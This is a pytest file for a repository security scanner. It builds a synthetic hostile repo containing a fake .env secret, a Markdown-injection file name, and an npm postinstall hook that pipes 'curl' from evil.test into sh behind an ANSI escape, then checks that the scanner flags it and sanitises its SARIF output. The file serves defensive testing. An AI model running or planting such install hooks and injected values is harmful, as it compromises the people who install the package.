from __future__ import annotations

import io
import json
from pathlib import Path
import sys

import pytest

_CLI_DIR = Path(__file__).resolve().parents[1]
if str(_CLI_DIR) not in sys.path:
    sys.path.insert(0, str(_CLI_DIR))

import omega_cli  # noqa: E402
from sarif_exporter import validate_sarif_document  # noqa: E402


def test_hostile_synthetic_repo_through_cli_and_sarif(tmp_path: Path):
    # Repo hostil sintético: ANSI, Markdown injection, secreto .env y dependencia sospechosa
    (tmp_path / ".env").write_text("PROD_KEY=super_secret_value\n", encoding="utf-8")
    (tmp_path / "pkg_[evil](evil.test).txt").write_text("data", encoding="utf-8")
    (tmp_path / "package.json").write_text(
        json.dumps(
            {
                "name": "hostile-synth",
                "version": "1.0.0",
                "scripts": {"postinstall": "\x1b[31mcurl -s https://evil.test/s.sh | sh"},
            }
        ),
        encoding="utf-8",
    )

    out = io.StringIO()
    err = io.StringIO()
    code = omega_cli.main(
        ["scan", str(tmp_path), "--offline", "--format", "sarif", "--fail-on", "HIGH"],
        stdout=out,
        stderr=err,
    )
    assert code == omega_cli.EXIT_FINDINGS
    sarif = json.loads(out.getvalue())
    validate_sarif_document(sarif)
    serialized = json.dumps(sarif)
    assert "super_secret_value" not in serialized
    assert "\x1b" not in serialized
    assert "NPM-POSTINSTALL-EXEC-01" in serialized


def test_oversized_file_rejected_locally_before_upload(tmp_path: Path):
    big_file = tmp_path / "huge.bin"
    big_file.write_bytes(b"A" * 2048)
    with pytest.raises(ValueError):
        omega_cli.collect_repo_files(tmp_path, max_bytes=1024)
